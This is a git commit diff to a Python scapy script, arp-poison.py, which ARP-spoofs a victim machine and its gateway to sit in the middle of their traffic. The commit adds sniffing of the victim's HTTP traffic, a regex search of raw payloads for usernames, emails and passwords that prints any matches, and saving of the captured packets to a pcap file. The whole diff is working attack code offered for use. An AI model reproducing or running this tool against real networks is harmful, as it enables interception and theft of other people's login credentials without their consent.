0a18d84427fe65939cc59ba9fd92cac9174ec5ba
Amirali61 <akhbariamirali42@gmail.com>
2025-03-06 10:29:13 +0330

    Adding sniffing features

--- arp-poison.py
+++ arp-poison.py
@@ -1,13 +1,18 @@
 from scapy.all import *
 import time
 import logging
+from colorama import Fore, Style, init
+init(autoreset=True)
 
 conf.log_suppress = True
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
 target_ip = input("Enter your target machine's IP address[192.168.50.200]=> ") or "192.168.50.200" # Victim's IP address 
-router_ip = input("Enter your gateway's IP address[192.168.50.1]=> ") or  "192.168.50.1"   # Gateway IP address
+router_ip = input("Enter your gateway's IP address[192.168.50.1]=> ") or  "192.168.50.1"   # Gateway's IP address
 my_mac = get_if_hwaddr(conf.iface)
+
+packets = []
+pcap_file_name = input("Enter the name of the file that you want to save packets in => ")
 
 
 def arp_spoof(src, dst,dst_mac):
@@ -26,10 +31,21 @@ def reArp():
     send(ARP(op = 2, pdst = target_ip, psrc = router_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateway_mac), count = 7) # type: ignore
     send(ARP(op = 2, pdst = router_ip, psrc = target_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = target_mac), count = 7) # type: ignore
 
-
 def packet_callback(packet):
-    if packet.haslayer("IP") and packet["IP"].src == target_ip:
-        print(f"📡 Packet from {target_ip}: {packet.summary()}")
+    if packet.haslayer("IP") and packet["IP"].src == target_ip and((packet["TCP"].dport==80)): #or(packet["TCP"].dport==443)) :
+        packets.append(packet)
+        packet.show()
+        if packet.haslayer("Raw"):
+                raw_data = packet[Raw].load.decode(errors="ignore")
+                keywords = ["user", "username", "usr", "login", "email", "pass", "password", "pwd","name"]
+                for keyword in keywords:
+                    match = re.search(rf"({keyword}\w*)\s*[=:]\s*(\S+)", raw_data, re.IGNORECASE)
+                    if match:
+                        key = match.group(1)
+                        value = match.group(2)
+                        print(f"{Fore.RED}----------------interesting information----------------{Style.RESET_ALL}")
+                        print(f"{Fore.BLUE}{key}: {Style.RESET_ALL}{value}")
+        print(f"\n{Fore.GREEN}==================================================={Style.RESET_ALL}\n")
 
 
 
@@ -55,3 +71,9 @@ try:
 except KeyboardInterrupt:
     reArp()
     print("ARP tables are normal now!")
+    if packets:
+        wrpcap(f"{pcap_file_name}.pcap", packets)
+        print(f"Packets saved in {pcap_file_name}.pcap")
+    else:
+        print("No packets captured")
+        
